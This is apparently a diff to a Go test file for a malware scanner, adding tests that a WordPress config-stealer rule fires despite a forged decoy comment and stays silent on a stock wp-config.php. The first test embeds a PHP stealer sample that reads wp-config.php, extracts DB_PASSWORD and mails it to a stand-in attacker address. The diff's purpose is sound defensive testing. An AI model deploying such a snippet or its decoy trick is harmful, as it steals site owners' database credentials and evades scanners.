@@ -247,3 +247,43 @@ func TestBackdoorPhpAutoAppend_LegitDirectiveTargetsStillExcluded(t *testing.T) 
 		}
 	}
 }
+
+// --- exploit_wp_config_stealer: forgeable exclude removed ---------------
+
+func TestExploitWpConfigStealer_ForgedDefineCommentStillFires(t *testing.T) {
+	scanner := loadRepoScanner(t)
+
+	// Attacker adds a decoy comment matching the old exclude_patterns
+	// token define('DB_PASSWORD'. The rule's min_match=3 structural
+	// constraint (wp-config.php substring + DB_PASSWORD substring +
+	// file_get_contents regex) is unchanged; only the forgeable
+	// content-allowlist is gone.
+	stealer := []byte(`<?php
+// define('DB_PASSWORD', 'legacy');  // decoy to bypass old exclude
+$conf = file_get_contents('/home/victim/public_html/wp-config.php');
+preg_match("/DB_PASSWORD.*'([^']+)'/", $conf, $m);
+mail('x@evil', 'creds', $m[1]);
+`)
+	matches := scanner.ScanContent(stealer, ".php")
+	if !hasRule(matches, "exploit_wp_config_stealer") {
+		t.Error("exploit_wp_config_stealer must fire despite forged define('DB_PASSWORD' decoy")
+	}
+}
+
+func TestExploitWpConfigStealer_StockWpConfigDoesNotFire(t *testing.T) {
+	scanner := loadRepoScanner(t)
+
+	// Real wp-config.php: declares the constants but does not call
+	// file_get_contents on itself. min_match=3 can never be reached.
+	wpConfig := []byte(`<?php
+define('DB_NAME', 'wp_site');
+define('DB_USER', 'wp_user');
+define('DB_PASSWORD', 'supersecret');
+define('DB_HOST', 'localhost');
+$table_prefix = 'wp_';
+`)
+	matches := scanner.ScanContent(wpConfig, ".php")
+	if hasRule(matches, "exploit_wp_config_stealer") {
+		t.Error("exploit_wp_config_stealer must not fire on stock wp-config.php")
+	}
+}
